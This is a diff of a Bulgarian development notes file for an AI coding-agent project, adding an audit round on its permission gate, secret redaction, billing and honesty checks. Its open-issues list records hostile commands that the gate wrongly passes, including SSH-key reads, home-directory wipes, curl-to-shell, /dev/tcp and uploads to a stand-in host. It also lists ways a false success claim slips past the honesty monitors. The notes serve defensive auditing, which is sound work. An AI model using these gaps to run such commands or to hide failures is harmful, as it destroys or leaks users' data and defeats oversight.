@@ -1,4 +1,4 @@
-# Следващи стъпки (обновено 2026-11-10)
+# Следващи стъпки (обновено 2026-11-10, седми кръг)
 
 > **Тази бележка е, за да се пестят токени, не за да се харчат повече.**
 > Тук вече е записано какво е проверено и решено. Вярвай ѝ и започни директно
@@ -6,6 +6,64 @@
 > Провери с grep само файловете, които ще пипаш. Отговаряй кратко. Когато
 > нещо се свърши, обнови бележката накратко: зачеркни или изтрий готовото,
 > не трупай нов текст.
+
+## 2026-11-10 — седми кръг одит (клон `claude/vigilant-noether-rdw2tm`)
+
+Четири независими прохода с пускане (облак; новото от 5–10.11; портата и инструментите;
+`genesis serve` + веригата и парите). Поправено, всяко с тест, който пада без него
+(`tests/test_audit_2026_11_10_*.py`, +1 в test_checkpoints); пълният пакет: 5675 passed.
+
+- **Облак**: отказът на шлюза оцелява и при тяло над 2 MB (6 MB: BrokenPipe 29/30 → 413);
+  уеб — `Origin: http://[` е 403 (нишката падаше), 413/415 четат тялото; BOM в keys.env и
+  prices.json; `can_buy` за абонат; „задържани“ се урежда и от „Сметка“; `limits
+  --max-tokens 0` спира хода без такса (3 хода: 100 → 94 кр.); лимит над TASK_BUDGET стига
+  до жетона; „Прати“ се освобождава след „Нов разговор“ насред задача.
+- **Веригата**: скъсан вече започнат поток на Anthropic (суров httpx, не APIConnectionError)
+  → следващият модел, не паднал ход; `max_retries=0` (SDK-то повтаряше зад гърба на
+  веригата: 429 с retry-after 10 → 20 s); **Sonnet 5.5 чете от кеша за $0.10, не $0.20** —
+  оттам идваха +5.6% спрямо конзолата; редове за Fable/Mythos 5.2 ($8/$40, кеш $0.20);
+  `genesis budget` не пада на ред с поле от грешен тип; два `genesis serve` (Desktop +
+  телефон) с един remote_seen.json вече не си трият видяното (повторение минаваше).
+- **Паметта/OAuth**: episodes.db — `redact(memory=True)`: без голото `-p/-u` и ИМЕ=стойност
+  (`mkdir -p ***`, `git push -u ***`, `sorted(rows, key=***`); завъртеният refresh токен
+  се дочаква на изход (`genesis -p` веднага след срока го губеше).
+- **Портата**: shutdown/reboot/halt/poweroff, mkfs, `format X:` блокират само като команда
+  (`grep shutdown`, `vagrant halt`, `ruff format C:\…`, `executor.shutdown()` бяха BLOCKED и
+  в allow); скрипт на входа на шел (`bash <<EOF`, `<<<`, `echo '…' | sh`) се оценява като
+  команда; hooks.json без името му в аргументите (`cd ~/.genesis && …`, `tar -C`, `unzip -d`,
+  `cp -rT`, `ln`, glob/променлива в целта) → пита; `rd/s/q`, `del/f/s/q`, `r^d`, `format /q D:`
+  → BLOCKED; `git -C/-c/--no-pager … reset --hard|clean|push` пита; READ_FILE/EDIT_FILE/
+  SEARCH_CODE крият master.key, .envrc, *.tfvars, secrets.toml като `cat`; /undo не пише
+  през файл, станал връзка навън.
+- `runs_code`: `node.exe`, `.\app.exe`, `run.bat`, `powershell -File`, `uv run`, `make run`.
+  bench_honesty след това: 15/15 хванати, 0/12 фалшиви.
+
+**Отворено от този кръг** (възпроизведено, непоправено — по реда на тежестта):
+- Портата: четене на тайни през `bash -c 'cat ~/.ss{h,x}/id_rs{a,b}'` (скоби), `cd; cat .s*/*`,
+  `grep -rh X ~`, `find ~ -exec cat {} +` — SAFE; целият дом: `mv ~ /tmp/x`, `find ~ -exec
+  truncate -s 0 {} +`, `find ~ -print0 | xargs -0 rm` — SAFE, а `rsync -a --delete /var/empty/
+  ~/`, `rm -rf ~/.*`, `chmod 777 -R /`, `cd $HOME && rm -rf *` — само питат; `git checkout -f`,
+  `git restore файл` — SAFE; качване: `curl -d @f https://localhost.x.example/` (изключението
+  за localhost гледа целия ред), `curl -sT`, `rsync f u@h:`, `curl … | zsh|python3`,
+  `bash <(curl …)`, `/dev/tcp/` — SAFE; `powershell [IO.Directory]::Delete($HOME,$true)`;
+  `echo … >> ~/.bashrc|.gitconfig` — SAFE; `git commit -m '… rm -rf / …'` — BLOCKED.
+- /permissions приема `pipenv *`, `bundle *`, `mise *`, `parallel *` (покриват всяка команда);
+  `npm *` покрива `npm explore pkg -- rm -rf build`.
+- /undo: EDIT + `chmod +x` в същия ход — правата остават; команда, сменила файл с връзка —
+  pending() обещава „върни“, undo го оставя.
+- Честността: „работи“ след срив, скрит от тръба (`python app.py 2>&1 | tail -5`, `|| true`)
+  минава; обратното — честно „работи“ след нарочен rc≠0 (`| grep -i error`, `timeout 3`,
+  pytest rc=5) се бележи и „нарочно“ не го чисти; `echo x > f`, `del`, `Remove-Item`, `ln -s`,
+  `find -delete` не доказват запис/триене; MismatchCheck не вижда `Test 2: FAIL`, `[FAIL]`,
+  `... FAILED`, `✗` в края, `1 of 3 tests failed`, а брояч `1/3 ok … 3/3 ok` е тревога;
+  TestEditCheck не вижда `def _test_x`, `return` пред assert, `except AssertionError: pass`.
+- redact (известия): `if event['key'] == 'Enter':` → `"***"`; още изтичат `password ==
+  "…"`, `ssh-keygen -p -P стара`, `WinRAR -hp…`, `{"pass_phrase": …}`. conversation_memory:
+  `api_key=os.environ["X"]` се реже, а `{"password": "…"}` и `mysql -p…` остават.
+- Шлюзът препраща оригиналните байтове: при дублиран ключ в JSON (`"model"` два пъти)
+  проверката гледа последния, доставчикът може да вземе първия — не е пробвано с ключ.
+- test_ctrl_c_in_parallel_reads_is_not_held_by_a_slow_read (e86464e) падна веднъж при
+  натоварена машина (4 одита успоредно); сам минава.
 
 ## 2026-11-10 — готов ли е за показване (клон `claude/gotov-20261110`)
 
@@ -39,8 +97,8 @@
   „Проверка на Stripe“). Live още не е включван.
 - Б: console (Cost, 30 дни, 10.11): $4.63 (Sonnet 5.5 $4.61, Opus 5.5 $0.02; баланс $95.37)
   срещу `genesis budget` $4.89 (Sonnet $4.86, Opus $0.025, 182 обръщения от 27.10) —
-  Genesis брои ~5.6% отгоре, т.е. таванът GENESIS_ANTHROPIC_MAX_USD спира по-рано, не
-  по-късно. Таблицата с токените в `budget` не показва тези 182 — пускани са от
+  Genesis броеше ~5.6% отгоре — четенето от кеша на Sonnet 5.5 по $0.20 вместо $0.10
+  (поправено в седмия кръг; на лаптопа: сравни пак след ден работа). Таблицата с токените в `budget` не показва тези 182 — пускани са от
   checkout, където DATA_DIR е genesis_agent/, а сборът в $ е в ~/.genesis.
 - site/public качен (10.11, f7e51b60): страницата е в Cloudflare акаунта, където е KV
   `genesis-waitlist` — не в този на другите сайтове; качване с `CLOUDFLARE_ACCOUNT_ID`
